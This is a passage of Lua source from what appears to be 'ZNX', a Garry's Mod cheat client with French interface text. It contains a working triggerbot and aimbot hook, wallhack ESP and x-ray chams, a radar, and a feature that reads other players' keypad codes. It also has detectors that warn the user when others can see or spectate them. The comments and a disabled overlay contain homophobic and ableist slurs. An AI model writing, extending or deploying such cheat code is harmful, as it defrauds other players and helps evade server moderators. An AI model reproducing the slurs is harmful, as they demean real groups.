local td = {start = ply:GetShootPos(), endpos = ply:GetShootPos() + ply:EyeAngles():Forward() * 65535, filter = ply, mask = MASK_SHOT}
local tr = util.TraceLine(td)
if (tr.Entity:IsPlayer() and ZNX.CanTargetPlayer( tr.Entity ) ) or tr.Entity:IsNPC() or tr.Entity.Type == "nextbot" then
if( !isfiring ) then
cmd:SetButtons( bit.bor( cmd:GetButtons(), IN_ATTACK ) )           
isfiring = true
else
cmd:SetButtons( bit.band( cmd:GetButtons(), bit.bnot( IN_ATTACK ) ) )                      
isfiring = false
end
end
end
if ZNX.ScrollDelta != 0 then cmd:SetMouseWheel( ZNX.ScrollDelta ) end
if( ZNX.Vars.RopeStorm and ply:KeyDown(IN_ATTACK2)) then
local aids = Angle(math.random(-90, 90), math.random(-180, 180), 0)
aids:Normalize()
cmd:SetViewAngles(aids)
if ply:KeyDown(IN_ATTACK2) then cmd:RemoveKey(IN_ATTACK2) end
end
if ZNX.Vars.FreecamControls then
local khn = ZNX.NumberVars.FreecamForward
if ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then ZNX.FreecamCoordinates.pos = ZNX.FreecamCoordinates.pos + ZNX.FreecamCoordinates.ang:Forward() * 7 end
local khn = ZNX.NumberVars.FreecamBack
if ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then ZNX.FreecamCoordinates.pos = ZNX.FreecamCoordinates.pos - ZNX.FreecamCoordinates.ang:Forward() * 7 end
local khn = ZNX.NumberVars.FreecamLeft
if ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then ZNX.FreecamCoordinates.ang.y = ZNX.FreecamCoordinates.ang.y + 1 end
local khn = ZNX.NumberVars.FreecamRight
if ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then ZNX.FreecamCoordinates.ang.y = ZNX.FreecamCoordinates.ang.y - 1 end
local khn = ZNX.NumberVars.FreecamUp
if ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then ZNX.FreecamCoordinates.ang.p = ZNX.FreecamCoordinates.ang.p - 0.75 end
local khn = ZNX.NumberVars.FreecamDown
if ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then ZNX.FreecamCoordinates.ang.p = ZNX.FreecamCoordinates.ang.p + 0.75 end
end
ZNX.AimbotCore( cmd )
ZNX.MemoryDebug["aimbot"] = gcinfo() - amemfootprint
end
hook.Add( "CreateMove", "cmove", ZNX.CreateMove )
local xraytrans = Color(255, 255, 255, 101)
surface.CreateFont( "memes", {
font = "Trebuchet",
size = 200,
weight = 950,
} )
local scanmat = Material("particle/particle_ring_blur")
local leadermat = Material( "particle/particle_ring_wave_additive" )
local beammat = Material("trails/laser")
function ZNX.Vision()
local me = LocalPlayer()
if !me:IsValid() then return end
local memfootprint = gcinfo()
--[[
for i = 0, ScrH(), 200 do
for w = 0, ScrW(), 200 do
draw.SimpleTextOutlined( ":^)", "memes", w, i, Color(255,255,255,255), 0, 0, 1, Color(0,0,55,255) )
end
end
draw.SimpleTextOutlined( "IM A HUGE FUCKING FAGGOT", "memes", 200, ScrH() / 2 - 230, Color(255,0,0,255), 0, 0, 1, Color(0,0,55,255) )
draw.SimpleTextOutlined( "WHO USES LEAKED HACKS", "memes", 260, ScrH() / 2 - 50, Color(255,0,0,255), 0, 0, 1, Color(0,0,55,255) )
draw.SimpleTextOutlined( "COS IM POOR AND RETARDED", "memes", 180, ScrH() / 2 + 150, Color(255,0,0,255), 0, 0, 1, Color(0,0,55,255) )
--]]
if !ZNX.Vars.Vision then return end
if ZNX.Vars.CSFlashlight then
local dlight = DynamicLight( me:EntIndex() + 5 )
if ( dlight ) then
dlight.pos = me:GetEyeTraceNoCursor().HitPos
dlight.r = 255
dlight.g = 255
dlight.b = 255
dlight.brightness = 2
dlight.Decay = 1000
dlight.Size = 2256
dlight.DieTime = CurTime() + 0.5
end
end
if ZNX.Vars.ShowFPS then
DrawOutlinedText ( os.date( "%H:%M:%S"), "Fontnpcesp", ScrW()-40, 10, Color(255,255,0,255), 1, Color(0,0,0,255) )   
DrawOutlinedText ( "FPS: ", "Fontnpcesp", ScrW()-48, 23, Color(255,255,0,255), 1, Color(0,0,0,255) )
DrawOutlinedText ( math.Round( 1/FrameTime()), "Fontnpcesp", ScrW()-28, 23, Color(255,255,0,255), 1, Color(0,0,0,255) )   
DrawOutlinedText ( "PING: ", "Fontnpcesp", ScrW()-46, 36, Color(255,255,0,255), 1, Color(0,0,0,255) )
DrawOutlinedText ( LocalPlayer():Ping(), "Fontnpcesp", ScrW()-27, 36, Color(255,255,0,255), 1, Color(0,0,0,255) )
end     
if ZNX.Vars.ShowESP then
if ZNX.Vars.NPC_ESP then 
for k, v in pairs(ents.GetAll()) do 
if(  v ~= LocalPlayer() ) then 
if( v:IsNPC() ) then 
local drawColor = Color(238, 206, 48, 255); 
local drawPosit = v:GetPos():ToScreen(); 
local textData = {} 
textData.pos = {} 
textData.pos[1] = drawPosit.x; 
textData.pos[2] = drawPosit.y; 
textData.color = drawColor; 
textData.text = v:GetClass(); 
textData.font = "Fontnpcesp"; 
textData.xalign = TEXT_ALIGN_CENTER; 
textData.yalign = TEXT_ALIGN_CENTER; 
draw.Text( textData ); 
end 
end 
end 
end 
-- players
for k, v in pairs( player.GetAll() ) do
if ZNX.ToMetric( me:GetPos():Distance( v:GetPos() ) ) > ZNX.NumberVars.VisionDist then continue end
if !ZNX.OnScreen( v, 50 ) then continue end
local teamcol, teamcol2
if ZNX.Vars.TeamColors then
teamcol = team.GetColor(v:Team())
teamcol2 = Color(math.Clamp(teamcol.r - 100, 0, 255), math.Clamp(teamcol.g - 100, 0, 255), math.Clamp(teamcol.b - 100, 0, 255), 255)
else
teamcol = ZNX.DefaultScheme
teamcol2 = ZNX.DefaultScheme2
end
if v == me then continue end
local pos = (v:GetPos()+Vector(0,0,70)):ToScreen()
local admintext = ZNX.GetRank( v )
if !ZNX.IsDead( v ) then
if ZNX.Vars.VSquares then
local posrep = (v:GetPos()+Vector(0,0,40)):ToScreen()
surface.SetDrawColor(teamcol)
surface.DrawOutlinedRect(posrep.x - 10, posrep.y - 10, 20, 20)
surface.SetDrawColor(teamcol2)
surface.DrawOutlinedRect(posrep.x - 8, posrep.y - 8, 16, 16)
surface.SetDrawColor(Color(255,255,255,255))
surface.DrawRect(posrep.x - 2, posrep.y - 2, 4, 4)
end
if ZNX.Vars.VNames then draw.SimpleTextOutlined( v:Name(), "DermaDefault", pos.x, pos.y - 62, teamcol, 1, 0, 1, Color(0,0,55,255) ) end
if ZNX.Vars.BoundingBox3d then cam.Start3D(EyePos(),EyeAngles()) render.DrawWireframeBox( v:GetPos(), Angle(0,0,0), Vector( -16, -16, 0 ), Vector( 16, 16, 72 ), ZNX.ColScheme, true ) cam.End3D() end
-- propkill shit
render.SetMaterial( beammat )
if ZNX.Vars.PKPlayerBeams then
local vz, ppos = ZNX.PlayerVisiblePK( me:GetShootPos(), v )
if vz then
cam.Start3D(EyePos(),EyeAngles())
render.DrawBeam( (me:GetShootPos() + Vector(0,0,-5)) + EyeAngles():Forward() * 5, ppos, 5, 0, 1, teamcol )
cam.End3D()
end
end
if ZNX.Vars.PKPropBeams then
if ZNX.HoldingProp and ZNX.HoldingProp:IsValid() then
local src = ZNX.HoldingProp:LocalToWorld( ZNX.HoldingProp:OBBCenter() )
--[[
cam.Start3D(EyePos(),EyeAngles())
render.StartBeam( 5 )
for i = 0, 4 do
local zp = src + (me:GetAimVector() * (i * 200)) + Vector( 0, 0, -(i ^ 3.15))
render.AddBeam( zp, 150, i, Color( 255, 100, 0) )
end
render.EndBeam()
render.DrawBeam( me:EyePos(), me:EyePos() + me:GetAimVector() * 2000, 50, 0, 1, Color( 255, 100, 0) )
cam.End3D()
--]]
local vz2, ppos2 = ZNX.PlayerVisiblePK( src, v )
if vz2 then
cam.Start3D(EyePos(),EyeAngles())
render.DrawBeam( src, ppos2, 50, 0, 1, teamcol2 )
cam.End3D()
end
end
end
-- target highlighting
if ZNX.Vars.ShowTargets and ZNX.IsTarget( v ) then
draw.SimpleTextOutlined( "[CIBLE]", "DermaDefault", math.Clamp(pos.x, 30, ScrW() - 54), math.Clamp(pos.y - 74, 30, ScrH() - 54), Color(255,155,0,255), 1, 0, 1, Color(55,20,0,255) )
surface.SetDrawColor(Color(255,155,0,255))
surface.DrawLine( ScrW() / 2, ScrH(), pos.x, pos.y  )
end
if ZNX.Vars.ShowFriends and ZNX.IsFriend( v ) and !ZNX.IsTarget( v ) then
draw.SimpleTextOutlined( "[AMI]", "DermaDefault", pos.x, pos.y - 74, Color(0,255,0,255), 1, 0, 1, Color(0,0,55,255) )
end
if ZNX.Vars.ShowRanks and !(admintext == "user" or admintext == "guest" or admintext == "player") then
draw.SimpleTextOutlined( "["..admintext.."]", "DermaDefault", pos.x, pos.y - 90, Color(255,100,0,255), 1, 0, 1, Color(50,0,0,255) )
end
if ZNX.Vars.Vizlines then
local tr = util.TraceLine ({
start = v:EyePos(),
endpos = v:EyePos() + v:GetAimVector() * 5000,
filter = v,
mask = MASK_SOLID_BRUSHONLY
})
local tp = tr.HitPos:ToScreen()
local p = v:EyePos():ToScreen()
surface.DrawLine(p.x, p.y, tp.x, tp.y)
surface.SetDrawColor(teamcol)
surface.DrawLine(tp.x - 4, tp.y, tp.x + 4, tp.y)
surface.DrawLine(tp.x, tp.y - 4, tp.x, tp.y + 4)
end
if ZNX.Vars.ShowDistance then 
draw.SimpleTextOutlined( ZNX.ToMetric(me:GetPos():Distance(v:GetPos())).."m", "DermaDefault", pos.x, pos.y - 40, teamcol, 1, 0, 1, Color(0,0,55,255) )
end
if ZNX.Vars.ShowHP then
local colhp = math.Clamp(v:Health() * 3, 0, 255)
local colcomp = Color(255,colhp,0,255)
draw.SimpleTextOutlined( tostring(v:Health()).."%", "DermaDefault", pos.x, pos.y - 51, colcomp, 1, 0, 1, Color(0,0,0,255) )
end
if ZNX.Vars.ArmeESP then
if(v:GetActiveWeapon():IsValid()) then
draw.SimpleTextOutlined( v:GetActiveWeapon():GetClass(), "DermaDefault", pos.x, pos.y -18, teamcol, 1, 0, 1, Color(0,0,55,255) )
end
end
if ZNX.Vars.ArgentESP then
local playermoney = (v.DarkRPVars and v.DarkRPVars.money) or 0
draw.SimpleTextOutlined( playermoney.."€", "DermaDefault", pos.x, pos.y - 28, teamcol, 1, 0, 1, Color(0,0,55,255) )
end
if ZNX.Vars.PKVelocity then
local velpos = ((v:GetPos() + Vector(0, 0, 45)) + v:GetVelocity() * 0.3 ):ToScreen()
surface.SetDrawColor(teamcol)
surface.SetMaterial( leadermat )
surface.DrawTexturedRect(velpos.x - 15, velpos.y - 15, 30, 30)
surface.SetDrawColor(teamcol2)
surface.DrawTexturedRect(velpos.x - 10, velpos.y - 10, 20, 20)
end
-- the fag is dead, i dunno why i did a second logic block for this, im just retarded i guess
elseif ZNX.Vars.ShowDead then
surface.SetDrawColor(Color(255,255,255,255))
surface.DrawLine(pos.x - 15, pos.y - 15, pos.x + 15, pos.y + 15)
surface.DrawLine(pos.x + 15, pos.y - 15, pos.x - 15, pos.y + 15)
if ZNX.Vars.VNames then draw.SimpleTextOutlined( v:Name(), "DermaDefault", pos.x, pos.y - 62, teamcol, 1, 0, 1, Color(0,0,55,255) ) end
if ZNX.Vars.ShowFriends and ZNX.IsFriend( v ) then
draw.SimpleTextOutlined( "[AMI]", "DermaDefault", pos.x, pos.y - 74, Color(0,255,0,255), 1, 0, 1, Color(0,0,55,255) )
end
if ZNX.Vars.ShowRanks and !(admintext == "user" or admintext == "guest" or admintext == "player") then
draw.SimpleTextOutlined( "["..admintext.."]", "DermaDefault", pos.x, pos.y -90, Color(255,100,0,255), 1, 0, 1, Color(50,0,0,255) )
end
if ZNX.Vars.ShowDistance then 
draw.SimpleTextOutlined( ZNX.ToMetric(me:GetPos():Distance(v:GetPos())).."m", "DermaDefault", pos.x, pos.y - 51, teamcol, 1, 0, 1, Color(0,0,55,255) )
end
end
end -- end of players loop
if ZNX.Vars.ESPProps then
for k, v in pairs(ents.FindByClass("prop_physics")) do
if ZNX.ToMetric( me:GetPos():Distance( v:GetPos() ) ) > ZNX.NumberVars.VisionDist then continue end
local pos = (v:LocalToWorld(v:OBBCenter())):ToScreen()
surface.SetDrawColor(Color(150,150,150,255))
surface.DrawOutlinedRect(pos.x - 10, pos.y - 10, 20, 20)
local aligndist = surface.GetTextSize( ZNX.ToMetric(me:GetPos():Distance(v:GetPos())).."m" )
draw.SimpleTextOutlined( ZNX.ToMetric(me:GetPos():Distance(v:GetPos())).."m", "DermaDefault", pos.x - (aligndist / 2), pos.y + 12, Color(200,200,200,255), 0, 0, 1, Color(0,0,55,255) )
end
end
if ZNX.Vars.Entfinder then
for k, v in pairs(ents.GetAll()) do
if ZNX.ToMetric( me:GetPos():Distance( v:GetPos() ) ) > ZNX.NumberVars.VisionDist then continue end
local drawing = false
for i,p in pairs(ZNX.MarkedEnts) do
if v:GetClass() == p then
drawing = true
end
end
if drawing then
local pos = (v:GetPos()+Vector(0,0,5)):ToScreen()
draw.SimpleTextOutlined( tostring("["..v:GetClass().."]"), "ESP", pos.x-30 , pos.y - 20, Color(235,0,0,255), 0, 0, 1, Color(0,0,0,255) )
end
end
end
end -- end of showesp
if ZNX.Freecam then
local CamData = {}
CamData.origin = ZNX.FreecamCoordinates.pos
CamData.angles = ZNX.FreecamCoordinates.ang
CamData.x = ZNX.NumberVars.MirrorX
CamData.y = ZNX.NumberVars.MirrorY
CamData.w = ScrW() / (ZNX.NumberVars.MirrorSize / 10)
CamData.h = ScrH() / (ZNX.NumberVars.MirrorSize / 10)
CamData.drawviewmodel = false
CamData.drawhud = false
CamData.fov = 90
render.RenderView( CamData )
end
if ZNX.Vars.Mirror then
local CamData = {}
if ZNX.NumberVars.MirrorAxis == 0 then
CamData.angles = Angle(0,me:EyeAngles().yaw - 180,0)
elseif ZNX.NumberVars.MirrorAxis == 1 then
CamData.angles = Angle(me:EyeAngles().pitch,me:EyeAngles().yaw - 180,0)
else
CamData.angles = Angle(-me:EyeAngles().pitch,me:EyeAngles().yaw - 180,0)
end
CamData.origin = me:GetPos()+Vector(0,0,50)
CamData.x = ZNX.NumberVars.MirrorX
CamData.y = ZNX.NumberVars.MirrorY
CamData.w = ScrW() / (ZNX.NumberVars.MirrorSize / 10)
CamData.h = ScrH() / (ZNX.NumberVars.MirrorSize / 10)
CamData.drawviewmodel = false
CamData.drawhud = false
CamData.fov = 90
render.RenderView( CamData )
end
if ZNX.Vars.PreviewTarget then
local t = ZNX.AimbotPreviewTarget
if isvector( t ) then 
local p = t:ToScreen()
surface.SetDrawColor(Color(200,0,0,255))
surface.DrawRect(p.x-1, p.y + 2, 2, 5)
surface.DrawRect(p.x-1, p.y - (2 + 5), 2, 5)
surface.DrawRect(p.x + 2, p.y-1, 5, 2)
surface.DrawRect(p.x - (2 + 5), p.y-1, 5, 2)
end
end
if ZNX.Vars.Radar then
local size = ZNX.NumberVars.RadarSize
local fov = ZNX.NumberVars.RadarZoom
local x = ZNX.NumberVars.RadarX
local y = ZNX.NumberVars.RadarY
surface.SetDrawColor(ZNX.DefaultScheme.r, ZNX.DefaultScheme.g, ZNX.DefaultScheme.b, ZNX.NumberVars.RadarAlpha)
surface.DrawRect(x - 2, y - 2, size + 4, size + 4)
surface.SetDrawColor(Color(20, 20, 20, ZNX.NumberVars.RadarAlpha))
surface.DrawRect(x, y, size, size)
surface.SetDrawColor(Color(30, 30, 30, 255))
surface.DrawLine(x, y, x + (size / 2), y + (size / 2))
surface.DrawLine(x + size, y, x + (size / 2), y + (size / 2))
surface.SetDrawColor(ZNX.DefaultScheme)
surface.DrawRect((x -2)+ (size/2), (y-2) + (size/2), 4, 4)
for key, ply in pairs(player.GetAll()) do
local teamcol = team.GetColor(ply:Team())
if ply != me and !ZNX.IsDead( ply ) then
local lx = me:GetPos().x - ply:GetPos().x
local ly = me:GetPos().y - ply:GetPos().y
local ang = EyeAngles().y
local cos = math.cos(math.rad(-ang))
local sin = math.sin(math.rad(-ang))
local px = (ly * cos) + (lx * sin)
local py = (lx * cos) - (ly * sin)
px = px / fov
py = py / fov
px = math.Clamp(px, -(size * 0.50), size * 0.50)
py = math.Clamp(py, -(size * 0.50), size * 0.50)
local name = player.GetAll()[key]:Nick()
draw.SimpleText(name, "default", x + size - (size * 0.50) + px - 13, y + size - (size * 0.50) + py - 7, teamcol, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
surface.SetDrawColor(teamcol)
surface.DrawRect(x + size - (size * 0.50) + px, y + size - (size * 0.50) + py, 3, 3)
end
end
end
function GAMEMODE:HUDDrawTargetID()
return false
end 
if ZNX.Vars.Crosshair then
local degage = {
["CHudCrosshair"]=true,
}
hook.Add("HUDShouldDraw", "RemovefuckingCrosshair_", function(name)
if degage[name] then return false end
end)
local hitpos = util.TraceLine ({
start = me:GetShootPos(),
endpos = me:GetShootPos() + me:GetAimVector() * 4096,
filter = me,
mask = MASK_SHOT
}).HitPos
local screenpos = hitpos:ToScreen()
local x = screenpos.x
local y = screenpos.y
if not ZNX.NameStealPlayer:KeyDown(IN_ATTACK2) then
surface.SetDrawColor(Color(0,0,0, 200))
surface.DrawRect((ScrW() / 2) - 2, (ScrH() / 2) - 2, 4, 4)
surface.SetDrawColor(Color(175,238,238, 200))
surface.DrawRect((ScrW() / 2) - 1, (ScrH() / 2) - 1, 2, 2)
end
--surface.DrawRect(x-1, y + 6, 2, 20)
--surface.DrawRect(x-1, y - (6 + 20), 2, 20)
--surface.DrawRect(x + 6, y-1, 20, 2)
--surface.DrawRect(x - (6 + 20), y-1, 20, 2)
if ZNX.CrossHairAlpha > 0 then ZNX.CrossHairAlpha = math.Clamp(ZNX.CrossHairAlpha - 6, 0, 255) end
surface.SetDrawColor(Color(255, 255, 255, ZNX.CrossHairAlpha))
surface.DrawLine(x - 12, y + 12, x - 6, y + 6)
surface.DrawLine(x + 12, y + 12, x + 6, y + 6)
surface.DrawLine(x - 12, y - 12, x - 6, y - 6)
surface.DrawLine(x + 12, y - 12, x + 6, y - 6)
local x = ScrW()*.5
local y = ScrH()*.57
target = LocalPlayer():GetEyeTrace().Entity
if LocalPlayer():Alive() and LocalPlayer():GetActiveWeapon():IsValid() and (target:IsPlayer()) then
local colhp = math.Clamp(target:Health() * 3, 0, 255)
local colcomp = Color(255,colhp,0,255)
draw.DrawText(target:Nick(), "default", x, y -17, team.GetColor(target:Team()), 1)
draw.DrawText(target:Health().."%", "default", x, y , colcomp, 1)
end
else
hook.Remove("HUDShouldDraw", "RemovefuckingCrosshair_")
end
if isvector( ZNX.CurrentBase ) then
local sc = (ZNX.CurrentBase + Vector( 0, 0, 10 )):ToScreen()
draw.SimpleText("Alarme", "default", sc.x, sc.y - 42, ZNX.DefaultScheme, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( ZNX.ToMetric( LocalPlayer():GetPos():Distance( ZNX.CurrentBase ) ).."m", "default", sc.x, sc.y - 30, ZNX.DefaultScheme, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
surface.SetDrawColor( Color(205,205,255, 100 ) )
draw.NoTexture()
local triangle = {
{ x = sc.x - 10, y = sc.y - 20 },
{ x = sc.x + 10, y = sc.y - 20 },
{ x = sc.x, y = sc.y },
}
surface.DrawPoly( triangle ) 
end
if ZNX.Vars.KeypadJew then
local e = me:GetEyeTrace().Entity
if IsValid(e) and string.find( e:GetClass(), "Keypad") then
local text;
local color;
if(e.code && e.code != "") then
text = e.code;
color = Color( 105, 255, 105, 150 )
elseif(e.tempCode && e.tempCode != "") then
text = e.tempCode;
color = Color( 250, 150, 150, 150 )
else
text = "Inconnu"
color = Color(150,150,150,150)
end
--        draw.WordBox( 8, ScrW() / 2, ScrH() / 2, text, "Default", color, Color(255,255,255,255) )
surface.SetDrawColor( Color( 0,0,50, 150 ) )
surface.SetMaterial( grad )
surface.DrawTexturedRect( ScrW() / 2 + 57, ScrH() / 2 - 7, 50, 15 )
draw.SimpleText(text, "DermaDefault", ScrW() / 2 + 60, ScrH() / 2, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
end
for k,v in pairs(ents.GetAll()) do
if IsValid(v) and string.find( v:GetClass(), "Keypad") then
if v != e and me:GetPos():Distance( v:GetPos() ) < 8000 then
local pos = v:GetPos():ToScreen()
if pos.x > 0 and pos.x < ScrW() and pos.y > 0 and pos.y < ScrH() then
if (v.code && v.code != "") then
surface.SetDrawColor( Color( 0,0,50, 150 ) )
surface.SetMaterial( grad )
surface.DrawTexturedRect( pos.x, pos.y, 50, 15 )
draw.SimpleText( v.code, "DermaDefault", pos.x + 5, pos.y + 6, Color( 105, 255, 105, 150 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
--                        draw.WordBox( 8, pos.x-5, pos.y-5, v.code, "Default", Color( 0, 255, 0, 150 ), Color(255,255,255,255) )
else
if(v.tempCode && v.tempCode != "") then
surface.SetDrawColor( Color( 0,0,50, 150 ) )
surface.SetMaterial( grad )
surface.DrawTexturedRect( pos.x, pos.y, 50, 15 )
draw.SimpleText( v.tempCode, "DermaDefault", pos.x + 5, pos.y + 6, Color( 250, 150, 150, 150 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
else
surface.SetDrawColor( Color( 0,0,50, 150 ) )
surface.SetMaterial( grad )
surface.DrawTexturedRect( pos.x, pos.y, 50, 15 )
draw.SimpleText( "Inconnu", "DermaDefault", pos.x + 5, pos.y + 6, Color(150,150,150,150), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
end
end
end
end
end
end
end
if ZNX.Vars.Bhop then
local sped = me:GetVelocity():Length()
draw.SimpleText("Vélocité: "..math.Round( sped ), "DermaDefault", (ScrW() / 2), ScrH() - 60, ZNX.DefaultScheme, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
surface.SetDrawColor( ZNX.DefaultScheme )
surface.DrawOutlinedRect( (ScrW() / 2) - 100, ScrH() - 50, 200, 10 )
surface.SetDrawColor( Color( ZNX.DefaultScheme.r, ZNX.DefaultScheme.g, ZNX.DefaultScheme.b, 100 ) )
surface.DrawRect( (ScrW() / 2) - 100, ScrH() - 50, math.Clamp( (sped / 2000) * 200, 0, 200 ), 10 )
end
if ZNX.Vars.WitnessDetector then
if #ZNX.Witnesses > 0 then
surface.SetDrawColor( ZNX.DefaultScheme )
surface.DrawRect( (ScrW() / 2) - 150, 0, 300, (#ZNX.Witnesses * 20) + 30)
surface.SetDrawColor( Color(0, 0, 0, 250) )
surface.DrawRect( (ScrW() / 2) - 145, 25, 290, (#ZNX.Witnesses * 20) )
draw.SimpleText("Ces personnes peuvent vous voir", "DermaDefault", (ScrW() / 2) - 77, 10, Color(255, 255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
for k, v in pairs(ZNX.Witnesses) do
if !v:IsValid() then continue end -- let this pass silently, it only spams briefly when some faggot dcs anyway
draw.SimpleText(v:Nick(), "DermaDefault", (ScrW() / 2) - 140, 8 + (k * 20), ZNX.GetESPColor( v ) )
end
end    
end
if ZNX.Vars.SpectatorDetector then
local starty = 0
if ZNX.Vars.WitnessDetector then starty = (#ZNX.Witnesses * 20) + 35 end
if ZNX.TheyHaveEyesEverywhere and #ZNX.TheyHaveEyesEverywhere > 0 then
surface.SetDrawColor( ZNX.DefaultScheme )
surface.DrawRect( (ScrW() / 2) - 150, starty, 300, (#ZNX.TheyHaveEyesEverywhere * 20) + 30)
surface.SetDrawColor( Color(0, 0, 0, 250) )
surface.DrawRect( (ScrW() / 2) - 145, starty + 25, 290, (#ZNX.TheyHaveEyesEverywhere * 20) )
draw.SimpleText("Ces personnes vous spectate", "DermaDefault", (ScrW() / 2) - 70, starty + 10, Color(255, 255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
for k, v in pairs( ZNX.TheyHaveEyesEverywhere ) do
if !v:IsValid() then continue end -- let this pass silently, it only spams briefly when some faggot dcs anyway
draw.SimpleText(v:Nick(), "DermaDefault", (ScrW() / 2) - 140, starty + 8 + (k * 20), ZNX.GetESPColor( v ) )
end
end    
end
-- ent scanner
if ZNX.EntScanner then
local c = me:GetEyeTrace()
local screenpos = c.HitPos:ToScreen()
local x = screenpos.x
local y = screenpos.y
local pulse = math.abs( math.sin( CurTime() * 2 ) )
surface.SetDrawColor( ZNX.DefaultScheme )
surface.SetMaterial( scanmat )
surface.DrawTexturedRect( x - (15 + (pulse * 15)), y - (15 + (pulse * 15)), 30 + (pulse * 30), 30 + (pulse * 30) )
surface.SetDrawColor( ZNX.DefaultScheme2 )
surface.DrawTexturedRect( x - (12 + (pulse * 12)), y - (12 + (pulse * 12)), 24 + (pulse * 24), 24 + (pulse * 24) )
if c.Entity and c.Entity:IsValid() then
ZNX.EntScannerTab = {}
local e = c.Entity
ZNX.EntScannerEnt = e
if e:IsPlayer() then 
table.insert( ZNX.EntScannerTab, e:Nick() )
table.insert( ZNX.EntScannerTab, {e:SteamID(), Color(255,255,255)} )
table.insert( ZNX.EntScannerTab, {ZNX.GetRank( e ), Color( 255, 100, 0 )} )
table.insert( ZNX.EntScannerTab, "Sante: "..e:Health().."% Armure: "..e:Armor().."%" )
if DarkRP then
table.insert( ZNX.EntScannerTab, {DarkRP.formatMoney(e:getDarkRPVar("money")) or "$ERROR", Color( 50, 255, 50)} )
table.insert( ZNX.EntScannerTab, {"Vrai Nom: "..e:SteamName(), Color( 150, 150, 150)} )
end
if e:GetActiveWeapon() then table.insert( ZNX.EntScannerTab, "Arme dans sa main: "..(e:GetActiveWeapon():GetClass() or "None" ) ) end
local weps = {}
for _, g in pairs( e:GetWeapons() ) do table.insert( weps, g:GetClass() )end
table.insert( ZNX.EntScannerTab, {table.ToString( weps ), Color(155,155,255)} )
end
table.insert( ZNX.EntScannerTab, e:GetClass() )
table.insert( ZNX.EntScannerTab, e:GetModel() )
table.insert( ZNX.EntScannerTab, "Distance: "..ZNX.ToMetric(e:GetPos():Distance( me:GetPos() )).."m" )
end
local textx, texty = ScrW() / 2 + 50, ScrH() / 2
for k, v in pairs(ZNX.EntScannerTab) do
if istable( v ) then
draw.SimpleTextOutlined( v[1], "default", textx + 40, (texty - 40) + (k * 12), v[2], 0, 0, 1, Color(0,0,0) )
else
draw.SimpleTextOutlined( v, "default", textx + 40, (texty - 40) + (k * 12), ZNX.DefaultScheme, 0, 0, 1, Color(0,0,0) )
end
end
end
ZNX.MemoryDebug["hud"] = gcinfo() - memfootprint
end
hook.Add("HUDPaint", "znx_hud", ZNX.Vision)
---------------------------------------------- NEW XRAY HERE -------------------------------------------------
--[[
if ZNX.Vars.Xray then
for k, v in pairs(ents.GetAll()) do
if ZNX.ToMetric(me:GetPos():Distance(v:GetPos())) > ZNX.NumberVars.XrayDistance then if v:GetColor().a == 100 then v:SetColor(Color(255,255,255,255)) end continue end
-- set rendermode none?
if ZNX.Vars.XrayPlayers then
if v:IsValid() and v:IsPlayer() and v != LocalPlayer() and !ZNX.IsDead( v ) and ZNX.OnScreen( v ) then
cam.Start3D(EyePos(),EyeAngles())
if ZNX.Vars.NoChamColours then
v:SetMaterial(ZNX.mat1)
v:SetRenderMode(4)
v:SetColor(xraytrans)
render.SuppressEngineLighting( true )
render.MaterialOverride( ZNX.mat1 )
end
if ZNX.Vars.PKChams and ZNX.Vars.NoChamColours then render.SetColorModulation( 0, 1, 0 ) render.SetBlend(0.8) else render.SetColorModulation( ZNX.ColScheme.x, ZNX.ColScheme.y, ZNX.ColScheme.z ) render.SetBlend(0.3) end
v:DrawModel()
if IsValid( v:GetActiveWeapon() ) then
if ZNX.Vars.NoChamColours then render.SetColorModulation( ZNX.ColScheme2.x, ZNX.ColScheme2.y, ZNX.ColScheme2.z ) end
v:GetActiveWeapon():DrawModel()
end
render.SetBlend(1)
render.SuppressEngineLighting( false )
render.MaterialOverride( )
--                v:SetColor(Color(255,255,255,255))
cam.End3D()
end
end
if ZNX.Vars.XrayProps then
if v:IsValid() and v:GetClass() == "prop_physics" and ZNX.OnScreen( v ) then
cam.Start3D(EyePos(),EyeAngles())
if ZNX.Vars.NoChamColours then
v:SetMaterial(ZNX.mat1)
v:SetRenderMode(4)
v:SetColor(xraytrans)
render.SuppressEngineLighting( true )
render.MaterialOverride( ZNX.mat1 )
end
if ZNX.Vars.PKChams and ZNX.Vars.NoChamColours then render.SetColorModulation( 1, 0.2, 0 ) render.SetBlend(0.6) else render.SetColorModulation( ZNX.ColScheme2.x, ZNX.ColScheme2.y, ZNX.ColScheme2.z ) render.SetBlend(0.3) end
v:DrawModel()
render.SetBlend(1)
render.SuppressEngineLighting( false )
render.MaterialOverride( )
--            v:SetColor(Color(255,255,255,255))
cam.End3D()
end
end
if ZNX.Vars.XrayEntfinder then
local drawing = false
for i,p in pairs(ZNX.MarkedEnts) do
if v:GetClass() == p then
drawing = true
end
end
if drawing and ZNX.OnScreen( v ) then
cam.Start3D(EyePos(),EyeAngles())
v:SetMaterial(ZNX.mat1)
v:SetRenderMode(4)
v:SetColor(xraytrans)
render.SuppressEngineLighting( true )
render.MaterialOverride( ZNX.mat1 )
render.SetColorModulation( ZNX.ColScheme2.x, ZNX.ColScheme2.y, ZNX.ColScheme2.z )
render.SetBlend(0.3)
v:DrawModel()
render.SetBlend(1)
render.SuppressEngineLighting( false )
render.MaterialOverride( )
--            v:SetColor(Color(255,255,255,255))
cam.End3D()
end
end
end
end
--]]
function ZNX.DrawXrayEntity( ent, col, domat, ghost )
cam.Start3D( EyePos(), EyeAngles() )
cam.IgnoreZ( true )
if domat then render.MaterialOverride( ZNX.Mat1 ) end
render.SuppressEngineLighting( true )
